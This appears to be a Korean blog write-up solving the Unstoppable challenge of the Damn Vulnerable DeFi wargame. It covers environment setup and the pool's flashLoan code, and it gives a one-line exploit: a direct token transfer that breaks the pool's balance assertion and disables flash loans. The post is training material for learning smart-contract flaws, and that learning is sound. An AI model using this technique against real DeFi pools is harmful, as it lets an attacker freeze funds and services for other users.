---
title: "DamnVulnerableDefi Unstoppable 풀이"
author: IceBear
categories:
  - Wargame
tags:
  - DamnVulnerableDefi
  - Unstoppable
# table of contents
toc: true # 오른쪽 부분에 목차를 자동 생성해준다.
toc_label: "table of content" # toc 이름 설정
toc_icon: "bars" # 아이콘 설정
toc_sticky: true # 마우스 스크롤과 함께 내려갈 것인지 설정
---

[Damn Vulnerable DeFi]는 DeFi Smart Contract를 대상으로 하는 Wargame 사이트이다.
![Damn Vulnerable DeFi](/assets/images_post/2022-01-25-DamnVulnerableDefi-Unstoppable/damnvulnerabledefi.png)
해당 문제들을 풀어보면서 DeFi Smart Contract에서 발생하는 취약점 유형을 학습할 수 있다.
먼저 Wargame 문제 풀이를 위한 환경설정을 정리하고, 1번 챌린지인 Unstoppable을 풀어보도록 한다. 

## 환경설정

먼저 문제 Repository를 Clone 한다.
~~~
git clone https://github.com/OpenZeppelin/damn-vulnerable-defi.git
~~~

그리고 자바스크립트 패키지 매니저인 yarn을 설치한다.(여기서는 Mac 기준)
~~~
brew install yarn
~~~

그 뒤 yarn을 통해 필요한 패키지들을 설치한다.
~~~
yarn install
~~~

설치가 정상적으로 잘 되면 damn-vulnerable-defi 폴더로 이동하여 npm 명령을 통해 사용가능한 챌린지들을 확인할 수 있다.
~~~
➜  damn-vulnerable-defi ✗ npm run
Lifecycle scripts included in undefined:
  test
    npm run compile && npx mocha --timeout 5000 --exit --recursive test

available via `npm run-script`:
  unstoppable
    npm run compile && npx mocha --timeout 5000 --exit test/unstoppable/unstoppable.challenge.js
  truster
    npm run compile && npx mocha --timeout 5000 --exit test/truster/truster.challenge.js
  naive-receiver
    npm run compile && npx mocha --timeout 5000 --exit test/naive-receiver/naive-receiver.challenge.js
  side-entrance
    npm run compile && npx mocha --timeout 5000 --exit test/side-entrance/side-entrance.challenge.js
  the-rewarder
    npm run compile && npx mocha --timeout 5000 --exit test/the-rewarder/the-rewarder.challenge.js
  selfie
    npm run compile && npx mocha --timeout 5000 --exit test/selfie/selfie.challenge.js
  compromised
    npm run compile && npx mocha --timeout 5000 --exit test/compromised/compromised.challenge.js
  puppet
    npm run compile && npx mocha --timeout 5000 --exit test/puppet/puppet.challenge.js
  compile
    npx buidler compile
~~~

Wargame은 [OpenZeppelin Test Helper]를 통해 로컬에서 테스트할 수 있다.
각 문제에 대한 Exploit 코드는 test 폴더 밑 해당 문제 폴더에 존재하는 challenge.js 파일내에 추가하면 된다.
Unstoppable 문제의 js 파일을 보면 다음과 같이 친절하게 Exploit을 작성할 부분을 정의해두었다.
~~~
...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
});
...
~~~
그리고 npm 명령을 통해 Exploit을 실행할 수 있다.
~~~
npm run unstoppable
~~~

## Unstoppable 풀이

Contract 파일인 UnstoppableLender.sol 내 flashloan 함수는 다음과 같다.
~~~
function flashLoan(uint256 borrowAmount) external nonReentrant {
  require(borrowAmount > 0, "Must borrow at least one token");

  uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
  require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

  // Ensured by the protocol via the `depositTokens` function
  assert(poolBalance == balanceBefore);
        
  damnValuableToken.transfer(msg.sender, borrowAmount);
        
  IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
        
  uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
  require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
~~~

코드 중간에 assert로 poolBalance와 balanceBefore가 같음을 확인한다.
balanceBefore는 바로 위에서 해당 주소의 balance를 가지고 옴을 알 수 있다.
그에 반해 poolBalance는 전역 변수로 depositTokens 함수를 통해서만 추가될 수 있다.
~~~
...
uint256 public poolBalance;
...
function depositTokens(uint256 amount) external nonReentrant {
  require(amount > 0, "Must deposit at least one token");
  // Transfer token from sender. Sender must have first approved them.
  damnValuableToken.transferFrom(msg.sender, address(this), amount);
  poolBalance = poolBalance + amount;
}
...
~~~

하지만 ERC20 표준에 따라 transfer 함수를 통해 해당 contract에 token을 전송할 수 있다.
그럴 경우 balanceBefore 값이 증가하게 되고, 따라서 poolBalance 값과 balanceBefore 값이 불일치하게 된다.
이를 위한 js 파일내 exploit 코드는 다음과 같다.
~~~
...
it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
    await this.token.transfer(this.pool.address, ether('1'), {from: attacker });
    });
...
~~~

이를 npm으로 실행하면 다음 결과를 얻는다.
~~~
➜  damn-vulnerable-defi ✗ npm run unstoppable

> unstoppable
> npm run compile && npx mocha --timeout 5000 --exit test/unstoppable/unstoppable.challenge.js


> compile
> npx buidler compile

All contracts have already been compiled, skipping compilation.


  [Challenge] Unstoppable
    ✓ Exploit (50ms)


  1 passing (757ms)
~~~

## 마치며

DeFi에서 사용하는 Pool을 관리하는데 있어 Balance가 다양한 방식으로 조절될 수 있다.
특히 여러 체인을 연계하는 서비스의 경우 자체적으로 각 Token에 대한 Balance를 가지고 관리하는 경우 이러한 문제가 발생할 수 있다.


[Damn Vulnerable DeFi]: https://www.damnvulnerabledefi.xyz 
[OpenZeppelin Test Helper]: https://docs.openzeppelin.com/test-helpers/0.5/
